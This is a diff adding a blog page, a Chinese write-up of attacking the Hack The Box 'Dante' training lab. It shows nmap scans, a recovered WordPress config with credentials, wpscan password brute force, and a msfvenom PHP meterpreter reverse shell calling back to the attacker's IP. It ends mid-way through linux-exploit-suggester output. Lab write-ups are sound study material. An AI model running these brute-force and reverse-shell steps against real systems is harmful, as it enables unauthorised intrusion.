@@ -1,0 +1,1391 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>HTB Pro_Labs Dante打靶记录 | cr4eper's Home</title><meta name="author" content="cr4eper"><meta name="copyright" content="cr4eper"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="HTB Pro_Labs Dante打靶记录外网部分入口点是10.10.110.0&#x2F;24，我们先扫描开放的IP ┌──(root㉿kali)-[&#x2F;home&#x2F;kali] └─# nmap -sn 10.10.110.0&#x2F;24                        Starting Nmap 7.94SVN ( https:&#x2F;&#x2F;nma">
+<meta property="og:type" content="article">
+<meta property="og:title" content="HTB Pro_Labs Dante打靶记录">
+<meta property="og:url" content="https://cr4eper.github.io/2025/03/11/HTB%20Pro_Labs%20Dante%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95/index.html">
+<meta property="og:site_name" content="cr4eper&#39;s Home">
+<meta property="og:description" content="HTB Pro_Labs Dante打靶记录外网部分入口点是10.10.110.0&#x2F;24，我们先扫描开放的IP ┌──(root㉿kali)-[&#x2F;home&#x2F;kali] └─# nmap -sn 10.10.110.0&#x2F;24                        Starting Nmap 7.94SVN ( https:&#x2F;&#x2F;nma">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://raw.githubusercontent.com/cr4eper/Myphoto/img/img/wallhaven-3l17mv.png">
+<meta property="article:published_time" content="2025-03-10T16:00:00.000Z">
+<meta property="article:modified_time" content="2025-03-11T13:35:40.127Z">
+<meta property="article:author" content="cr4eper">
+<meta property="article:tag" content="内网">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/cr4eper/Myphoto/img/img/wallhaven-3l17mv.png"><link rel="shortcut icon" href="https://raw.githubusercontent.com/cr4eper/Myphoto/img/img/lingmeng.jpg"><link rel="canonical" href="https://cr4eper.github.io/2025/03/11/HTB%20Pro_Labs%20Dante%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css?v=4.13.0"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.5.1/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.33/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"/search.xml","preload":false,"top_n_per_article":1,"unescape":false,"languages":{"hits_empty":"找不到您查询的内容：${query}","hits_stats":"共找到 ${hits} 篇文章"}},
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"prismjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid@4.11.1/dist/infinitegrid.min.js',
+    buttonText: '加载更多'
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'HTB Pro_Labs Dante打靶记录',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2025-03-11 21:35:40'
+}</script><script>(win=>{
+      win.saveToLocal = {
+        set: (key, value, ttl) => {
+          if (ttl === 0) return
+          const now = Date.now()
+          const expiry = now + ttl * 86400000
+          const item = {
+            value,
+            expiry
+          }
+          localStorage.setItem(key, JSON.stringify(item))
+        },
+      
+        get: key => {
+          const itemStr = localStorage.getItem(key)
+      
+          if (!itemStr) {
+            return undefined
+          }
+          const item = JSON.parse(itemStr)
+          const now = Date.now()
+      
+          if (now > item.expiry) {
+            localStorage.removeItem(key)
+            return undefined
+          }
+          return item.value
+        }
+      }
+    
+      win.getScript = (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        script.onerror = reject
+        script.onload = script.onreadystatechange = function() {
+          const loadState = this.readyState
+          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+          script.onload = script.onreadystatechange = null
+          resolve()
+        }
+
+        Object.keys(attr).forEach(key => {
+          script.setAttribute(key, attr[key])
+        })
+
+        document.head.appendChild(script)
+      })
+    
+      win.getCSS = (url, id = false) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onerror = reject
+        link.onload = link.onreadystatechange = function() {
+          const loadState = this.readyState
+          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+          link.onload = link.onreadystatechange = null
+          resolve()
+        }
+        document.head.appendChild(link)
+      })
+    
+      win.activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+        if (t === 'dark') activateDarkMode()
+        else if (t === 'light') activateLightMode()
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+      const detectApple = () => {
+        if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+          document.documentElement.classList.add('apple')
+        }
+      }
+      detectApple()
+    })(window)</script><meta name="generator" content="Hexo 6.3.0"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="https://raw.githubusercontent.com/cr4eper/Myphoto/img/img/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20241005141428.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">2</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">2</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">2</div></a></div><hr class="custom-hr"/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友情链接</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('https://raw.githubusercontent.com/cr4eper/Myphoto/img/img/wallhaven-3l17mv.png')"><nav id="nav"><span id="blog-info"><a href="/" title="cr4eper's Home"><span class="site-name">cr4eper's Home</span></a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search" href="javascript:void(0);"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友情链接</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">HTB Pro_Labs Dante打靶记录</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2025-03-10T16:00:00.000Z" title="发表于 2025-03-11 00:00:00">2025-03-11</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2025-03-11T13:35:40.127Z" title="更新于 2025-03-11 21:35:40">2025-03-11</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95/">打靶记录</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="HTB Pro_Labs Dante打靶记录"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="HTB-Pro-Labs-Dante打靶记录"><a href="#HTB-Pro-Labs-Dante打靶记录" class="headerlink" title="HTB Pro_Labs Dante打靶记录"></a>HTB Pro_Labs Dante打靶记录</h1><h2 id="外网部分"><a href="#外网部分" class="headerlink" title="外网部分"></a>外网部分</h2><p>入口点是10.10.110.0&#x2F;24，我们先扫描开放的IP</p>
+<pre class="line-numbers language-none"><code class="language-none">┌──(root㉿kali)-[&#x2F;home&#x2F;kali]
+└─# nmap -sn 10.10.110.0&#x2F;24                       
+Starting Nmap 7.94SVN ( https:&#x2F;&#x2F;nmap.org ) at 2025-02-10 01:15 EST
+Nmap scan report for 10.10.110.2
+Host is up (0.43s latency).
+Nmap scan report for 10.10.110.100
+Host is up (0.31s latency).
+Nmap done: 256 IP addresses (2 hosts up) scanned in 33.42 seconds<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>然后扫描下<code>10.10.110.100</code>这个ip,看下结果</p>
+<pre class="line-numbers language-none"><code class="language-none">┌──(root㉿kali)-[&#x2F;home&#x2F;kali]
+└─# nmap -A 10.10.110.100  
+Nmap scan report for 10.10.110.100
+Host is up (0.46s latency).
+Not shown: 997 filtered tcp ports (no-response)
+PORT      STATE SERVICE VERSION
+21&#x2F;tcp    open  ftp     vsftpd 3.0.3
+| ftp-anon: Anonymous FTP login allowed (FTP code 230)
+|_Can&#39;t get directory listing: PASV IP 172.16.1.100 is not the same as 10.10.110.100
+| ftp-syst: 
+|   STAT: 
+| FTP server status:
+|      Connected to ::ffff:10.10.17.141
+|      Logged in as ftp
+|      TYPE: ASCII
+|      No session bandwidth limit
+|      Session timeout in seconds is 300
+|      Control connection is plain text
+|      Data connections will be plain text
+|      At session startup, client count was 2
+|      vsFTPd 3.0.3 - secure, fast, stable
+|_End of status
+22&#x2F;tcp    open  ssh     OpenSSH 8.2p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   3072 8f:a2:ff:cf:4e:3e:aa:2b:c2:6f:f4:5a:2a:d9:e9:da (RSA)
+|   256 07:83:8e:b6:f7:e6:72:e9:65:db:42:fd:ed:d6:93:ee (ECDSA)
+|_  256 13:45:c5:ca:db:a6:b4:ae:9c:09:7d:21:cd:9d:74:f4 (ED25519)
+65000&#x2F;tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
+|_http-title: Apache2 Ubuntu Default Page: It works
+|_http-server-header: Apache&#x2F;2.4.41 (Ubuntu)
+| http-robots.txt: 2 disallowed entries 
+|_&#x2F;wordpress DANTE&#123;Y0u_Cant_G3t_at_m3_br0!&#125;
+Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
+OS fingerprint not ideal because: Missing a closed TCP port so results incomplete
+No OS matches for host
+Network Distance: 2 hops
+Service Info: OSs: Unix, Linux; CPE: cpe:&#x2F;o:linux:linux_kernel
+
+TRACEROUTE (using port 22&#x2F;tcp)
+HOP RTT       ADDRESS
+1   549.57 ms 10.10.16.1 (10.10.16.1)
+2   549.66 ms 10.10.110.100 (10.10.110.100)
+
+OS and Service detection performed. Please report any incorrect results at https:&#x2F;&#x2F;nmap.org&#x2F;submit&#x2F; .
+Nmap done: 1 IP address (1 host up) scanned in 80.74 seconds
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>然后得到了第一个flag和端口信息，我们先访问web服务端口，扫描后发现一个&#x2F;wordpress路由</p>
+<p><img src="https://raw.githubusercontent.com/cr4eper/Myphoto/img/img/image-20250210152708431.png" alt="image-20250210152708431"></p>
+<p>然后用wpsacn扫出一个<code>.wp-config.php.swp</code>文件</p>
+<p><img src="https://raw.githubusercontent.com/cr4eper/Myphoto/img/img/image-20250210152818666.png" alt="image-20250210152818666"></p>
+<p>恢复后发现如下内容：</p>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php">面]
+└─# cat /var/www/html/wordpress/wp-config.php 
+
+<span class="token comment">&lt;!-- Good Job at Finding the VIM SWAP File! --></span>
+<span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
+<span class="token comment">/**
+ * The base configuration for WordPress
+ *
+ * The wp-config.php creation script uses this file during the
+ * installation. You don't have to use the web site, you can
+ * copy this file to "wp-config.php" and fill in the values.
+ *
+ * This file contains the following configurations:
+ *
+ * * MySQL settings
+ * * Secret keys
+ * * Database table prefix
+ * * ABSPATH
+ *
+ * @link https://wordpress.org/support/article/editing-wp-config-php/
+ *
+ * @package WordPress
+ */</span>
+
+<span class="token comment">// ** MySQL settings - You can get this info from your web host ** //</span>
+<span class="token comment">/** The name of the database for WordPress */</span>
+<span class="token function">define</span><span class="token punctuation">(</span> <span class="token string single-quoted-string">'DB_NAME'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'wordpress'</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+<span class="token comment">/** MySQL database username */</span>
+<span class="token function">define</span><span class="token punctuation">(</span> <span class="token string single-quoted-string">'DB_USER'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'shaun'</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+<span class="token comment">/** MySQL database password */</span>
+<span class="token function">define</span><span class="token punctuation">(</span> <span class="token string single-quoted-string">'DB_PASSWORD'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'password'</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+<span class="token comment">/** MySQL hostname */</span>
+ <span class="token function">efine</span><span class="token punctuation">(</span> <span class="token string single-quoted-string">'DB_HOST'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'localhost'</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token comment">/** Database Charset to use in creating database tables. */</span>
+<span class="token function">define</span><span class="token punctuation">(</span> <span class="token string single-quoted-string">'DB_CHARSET'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'utf8mb4'</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+<span class="token comment">/** The Database Collate type. Don't change this if in doubt. */</span>
+<span class="token function">define</span><span class="token punctuation">(</span> <span class="token string single-quoted-string">'DB_COLLATE'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">''</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+<span class="token comment">/**#@+
+ * Authentication Unique Keys and Salts.
+ *
+ * Change these to different unique phrases!
+ * You can generate these using the &#123;@link https://api.wordpress.org/secret-key/1.1/salt/ WordPress.org secret-key service&#125;
+ * You can change these at any point in time to invalidate all existing cookies. This will force all users to have to log in again.
+ *
+ * @since 2.6.0
+ */</span>
+<span class="token function">define</span><span class="token punctuation">(</span> <span class="token string single-quoted-string">'AUTH_KEY'</span><span class="token punctuation">,</span>         <span class="token string single-quoted-string">'`i4M-OPF-&amp;:y_o`cJ.v!|=W:a_Haij>II.mI+JOJmgG,e|T:~]=#X $y53~>r=zp'</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token function">define</span><span class="token punctuation">(</span> <span class="token string single-quoted-string">'SECURE_AUTH_KEY'</span><span class="token punctuation">,</span>  <span class="token string single-quoted-string">'vRZ$$_BulH8-Pp%E%r0|r8Lf|2NCj~-po#AII#^IRKy]/gzjNb8bAH;Drr|-Mt0-'</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token function">define</span><span class="token punctuation">(</span> <span class="token string single-quoted-string">'LOGGED_IN_KEY'</span><span class="token punctuation">,</span>    <span class="token string single-quoted-string">'*u#~mm(H.9I1%knh&#123;`7.]OlsF3zItg$i;RVd9oG3J&amp;i+#WrvdS&lt;S>nSBX&#123;S)G4y`'</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token function">define</span><span class="token punctuation">(</span> <span class="token string single-quoted-string">'NONCE_KEY'</span><span class="token punctuation">,</span>        <span class="token string single-quoted-string">'v%/@I3c8yIm2q/_jtCa~if*?E&amp;mGe?CKE1.]|TOki8=acoL5]^xq&lt;x5AU2V*QNK&amp;'</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token function">define</span><span class="token punctuation">(</span> <span class="token string single-quoted-string">'AUTH_SALT'</span><span class="token punctuation">,</span>        <span class="token string single-quoted-string">'&lt;=y@F ]NRpB4b#aox6W&lt;K)#W`Jv~6n&lt;5!^@4Y[e` js&lt;j-&#125;$OcQl%1ynsgJCH?&amp;Z'</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token function">define</span><span class="token punctuation">(</span> <span class="token string single-quoted-string">'SECURE_AUTH_SALT'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'&#123;Xrv,GS#>7B(&#123;PjsgfyL&#125; 7ct1roDs5~keDYg2ae&#125;M6,e|+D#fVC(gA%O]&#123;Pz[Y]'</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token function">define</span><span class="token punctuation">(</span> <span class="token string single-quoted-string">'LOGGED_IN_SALT'</span><span class="token punctuation">,</span>   <span class="token string single-quoted-string">'c.T.hZjD5E9$>&lt;n?9/uav|G_9&lt;U`^7n_cF0s1w[[|@Q:etFp&#125;7^=Qgl~H?I&#123;|a,A'</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token function">define</span><span class="token punctuation">(</span> <span class="token string single-quoted-string">'NONCE_SALT'</span><span class="token punctuation">,</span>       <span class="token string single-quoted-string">'UAKOs%vl!RU S:reIECN^=uvXgV9PJSv(L4W+W.Q8]fR):P4Kk(@ML2&#125;crn?W)TB'</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+<span class="token comment">/**#@-*/</span>
+
+<span class="token comment">/**
+ * WordPress Database Table prefix.
+ *
+ * You can have multiple installations in one database if you give each
+ * a unique prefix. Only numbers, letters, and underscores please!
+ */</span>
+<span class="token variable">$table_prefix</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'wp_'</span><span class="token punctuation">;</span>
+
+<span class="token comment">/**
+ * For developers: WordPress debugging mode.
+ *
+ * Change this to true to enable the display of notices during development.
+ * It is strongly recommended that plugin and theme developers use WP_DEBUG
+ * in their development environments.
+ *
+ * For information on other constants that can be used for debugging,
+ * visit the documentation.
+ *
+ * @link https://wordpress.org/support/article/debugging-in-wordpress/
+ */</span>
+
+<span class="token function">define</span><span class="token punctuation">(</span> <span class="token string single-quoted-string">'WP_HTTP_BLOCK_EXTERNAL'</span><span class="token punctuation">,</span> <span class="token constant boolean">true</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token function">define</span><span class="token punctuation">(</span> <span class="token string single-quoted-string">'AUTOMATIC_UPDATER_DISABLED'</span><span class="token punctuation">,</span> <span class="token constant boolean">true</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token function">define</span><span class="token punctuation">(</span> <span class="token string single-quoted-string">'WP_AUTO_UPDATE_CORE'</span><span class="token punctuation">,</span> <span class="token constant boolean">false</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token function">define</span><span class="token punctuation">(</span> <span class="token string single-quoted-string">'WP_DEBUG'</span><span class="token punctuation">,</span> <span class="token constant boolean">true</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token function">define</span><span class="token punctuation">(</span> <span class="token string single-quoted-string">'WP_DEBUG_LOG'</span><span class="token punctuation">,</span> <span class="token constant boolean">true</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token comment">/* That's all, stop editing! Happy publishing. */</span>
+
+<span class="token comment">/** Absolute path to the WordPress directory. */</span>
+<span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span> <span class="token function">defined</span><span class="token punctuation">(</span> <span class="token string single-quoted-string">'ABSPATH'</span> <span class="token punctuation">)</span> <span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+        <span class="token function">define</span><span class="token punctuation">(</span> <span class="token string single-quoted-string">'ABSPATH'</span><span class="token punctuation">,</span> <span class="token constant">__DIR__</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'/'</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span>
+
+<span class="token comment">/** Sets up WordPress vars and included files. */</span>
+<span class="token keyword">require_once</span> <span class="token constant">ABSPATH</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'wp-settings.php'</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>没什么用，数据库端口没有没有在外部开放，获得权限之后的后渗透或许有用，我们先修改wpsan的命令语句再次进行扫描：</p>
+<p><code>wpscan --url http://10.10.110.100:65000/wordpress --enumerate</code>，扫描出如下结果</p>
+<p><img src="https://raw.githubusercontent.com/cr4eper/Myphoto/img/img/image-20250210180148651.png" alt="image-20250210180148651"></p>
+<p>发现两个用户，<code>admin</code>和<code>james</code>两个用户，然后我们直接通过wpscan爆破下这两个账号，先通过cewl工具生成下密码<code>cewl http://10.10.110.100:65000/wordpress/index.php/languages-and-frameworks &gt; words.txt</code></p>
+<p>然后爆破下<code>wpscan --url http://10.10.110.100:65000/wordpress --passwords /home/kali/桌面/words.txt</code></p>
+<p><img src="https://raw.githubusercontent.com/cr4eper/Myphoto/img/img/image-20250210183203134.png" alt="image-20250210183203134"></p>
+<p>最终得到了<code>james</code>的密码<code>Toyota</code>，我们用wpscan接着扫描：<code>wpscan --url http://10.10.110.100:65000/wordpress --enumerate ap,at,cb,dbe --user james --password Toyota </code>，没扫出啥东西，我们登陆看一下，发现在用户管理界面能够修改管理员的密码，我们修改后登陆下：</p>
+<p><img src="https://raw.githubusercontent.com/cr4eper/Myphoto/img/img/image-20250210231144453.png" alt="image-20250210231144453"></p>
+<p>登陆到管理员之后，我尝试了修改主题模板文件，发现php文件没法修改，然后上传插件，然后限制了大小导致无法上传，最后试过了修改插件文件，最后终于是成功了，通过msf反弹shell进行连接:</p>
+<pre class="line-numbers language-none"><code class="language-none">msfvenom -p php&#x2F;meterpreter&#x2F;reverse_tcp lhost&#x3D;10.10.17.141 lport&#x3D;4444 -o shell.php
+use exploit&#x2F;multi&#x2F;handler
+set payload php&#x2F;meterpreter&#x2F;reverse_tcp
+set lhost 10.10.17.141
+set lport 4444
+run<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p><img src="https://raw.githubusercontent.com/cr4eper/Myphoto/img/img/image-20250211001511239.png" alt="image-20250211001511239"></p>
+<p>然后就开始进行信息收集，再想办法提权，我们将漏洞扫描工具上传到服务器，然后扫描得到如下的提权漏洞：</p>
+<pre class="line-numbers language-none"><code class="language-none">.&#x2F;linux-exploit-suggester.sh
+
+Available information:
+
+Kernel version: 5.4.0
+Architecture: x86_64
+Distribution: ubuntu
+Distribution version: 20.04
+Additional checks (CONFIG_*, sysctl entries, custom Bash commands): performed
+Package listing: from current OS
+
+Searching among:
+
+81 kernel space exploits
+49 user space exploits
+
+Possible Exploits:
+
+cat: write error: Broken pipe
+cat: write error: Broken pipe
+[+] [CVE-2022-2586] nft_object UAF
+
+   Details: https:&#x2F;&#x2F;www.openwall.com&#x2F;lists&#x2F;oss-security&#x2F;2022&#x2F;08&#x2F;29&#x2F;5
+   Exposure: probable
+   Tags: [ ubuntu&#x3D;(20.04) ]&#123;kernel:5.12.13&#125;
+   Download URL: https:&#x2F;&#x2F;www.openwall.com&#x2F;lists&#x2F;oss-security&#x2F;2022&#x2F;08&#x2F;29&#x2F;5&#x2F;1
+   Comments: kernel.unprivileged_userns_clone&#x3D;1 required (to obtain CAP_NET_ADMIN)
+
+[+] [CVE-2021-4034] PwnKit
+
+   Details: https:&#x2F;&#x2F;www.qualys.com&#x2F;2022&#x2F;01&#x2F;25&#x2F;cve-2021-4034&#x2F;pwnkit.txt
+   Exposure: probable
+   Tags: [ ubuntu&#x3D;10|11|12|13|14|15|16|17|18|19|20|21 ],debian&#x3D;7|8|9|10|11,fedora,manjaro
+   Download URL: https:&#x2F;&#x2F;codeload.github.com&#x2F;berdav&#x2F;CVE-2021-4034&#x2F;zip&#x2F;main
+
+[+] [CVE-2021-3156] sudo Baron Samedit
+
+   Details: https:&#x2F;&#x2F;www.qualys.com&#x2F;2021&#x2F;01&#x2F;26&#x2F;cve-2021-3156&#x2F;baron-samedit-heap-based-overflow-sudo.txt
+   Exposure: probable
+   Tags: mint&#x3D;19,[ ubuntu&#x3D;18|20 ], debian&#x3D;10
+   Download URL: https:&#x2F;&#x2F;codeload.github.com&#x2F;blasty&#x2F;CVE-2021-3156&#x2F;zip&#x2F;main
+
+[+] [CVE-2021-3156] sudo Baron Samedit 2
+
+   Details: https:&#x2F;&#x2F;www.qualys.com&#x2F;2021&#x2F;01&#x2F;26&#x2F;cve-2021-3156&#x2F;baron-samedit-heap-based-overflow-sudo.txt
+   Exposure: probable
+   Tags: centos&#x3D;6|7|8,[ ubuntu&#x3D;14|16|17|18|19|20 ], debian&#x3D;9|10
+   Download URL: https:&#x2F;&#x2F;codeload.github.com&#x2F;worawit&#x2F;CVE-2021-3156&#x2F;zip&#x2F;main
+
+[+] [CVE-2021-22555] Netfilter heap out-of-bounds write
+
+   Details: https:&#x2F;&#x2F;google.github.io&#x2F;security-research&#x2F;pocs&#x2F;linux&#x2F;cve-2021-22555&#x2F;writeup.html
+   Exposure: probable
+   Tags: [ ubuntu&#x3D;20.04 ]&#123;kernel:5.8.0-*&#125;
+   Download URL: https:&#x2F;&#x2F;raw.githubusercontent.com&#x2F;google&#x2F;security-research&#x2F;master&#x2F;pocs&#x2F;linux&#x2F;cve-2021-22555&#x2F;exploit.c
+   ext-url: https:&#x2F;&#x2F;raw.githubusercontent.com&#x2F;bcoles&#x2F;kernel-exploits&#x2F;master&#x2F;CVE-2021-22555&#x2F;exploit.c
+   Comments: ip_tables kernel module must be loaded
+
+[+] [CVE-2022-32250] nft_object UAF (NFT_MSG_NEWSET)
+
+   Details: https:&#x2F;&#x2F;research.nccgroup.com&#x2F;2022&#x2F;09&#x2F;01&#x2F;settlers-of-netlink-exploiting-a-limited-uaf-in-nf_tables-cve-2022-32250&#x2F;
+https:&#x2F;&#x2F;blog.theori.io&#x2F;research&#x2F;CVE-2022-32250-linux-kernel-lpe-2022&#x2F;
+   Exposure: less probable
+   Tags: ubuntu&#x3D;(22.04)&#123;kernel:5.15.0-27-generic&#125;
